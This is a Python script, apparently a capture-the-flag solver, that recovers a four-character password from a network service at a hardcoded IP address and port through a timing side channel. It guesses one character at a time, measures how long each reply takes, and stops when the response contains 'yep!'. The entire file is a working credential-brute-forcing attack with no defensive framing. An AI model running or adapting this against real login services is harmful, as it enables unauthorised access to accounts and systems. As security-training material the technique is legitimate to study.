import socket
from string import printable
import time

def try_password_timed(host, port, password):
    try:
        # Create socket and connect
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        
        # Receive prompt
        s.recv(1024)
        
        # Time the response
        start = time.time()
        s.send((password + '\n').encode())
        response = s.recv(1024)
        end = time.time()
        
        s.close()
        return end - start, b'yep!' in response
        
    except Exception as e:
        print(f"Error with {password}: {e}")
        return 0, False

def find_password():
    HOST = "155.248.210.243"  # Replace with actual host
    PORT = 42191                 # Replace with actual port
    
    # Get all printable characters except space and newlines
    chars = [c for c in printable if c.isprintable() and c != ' ' and c != '\n']
    password = ""
    
    # For each position
    for position in range(4):
        print(f"\nTrying position {position}")
        times = []
        
        # Try each possible character
        for c in chars:
            test_password = password + c + "A" * (3 - position)  # Pad to full length
            time_taken, success = try_password_timed(HOST, PORT, test_password)
            
            if success:
                print(f"Found password: {test_password}")
                return test_password
                
            times.append((c, time_taken))
            print(f"Char {c}: {time_taken:.4f}s")
        
        # Sort by time taken (longest is likely correct for that position)
        times.sort(key=lambda x: x[1], reverse=True)
        password += times[0][0]
        print(f"Best char for position {position}: {times[0][0]} (took {times[0][1]:.4f}s)")
        
        # Optional: show top 5 candidates
        print("\nTop 5 candidates for this position:")
        for char, time_taken in times[:5]:
            print(f"{char}: {time_taken:.4f}s")
            
    return password

if __name__ == "__main__":
    found_password = find_password()
    print(f"\nFinal password found: {found_password}")
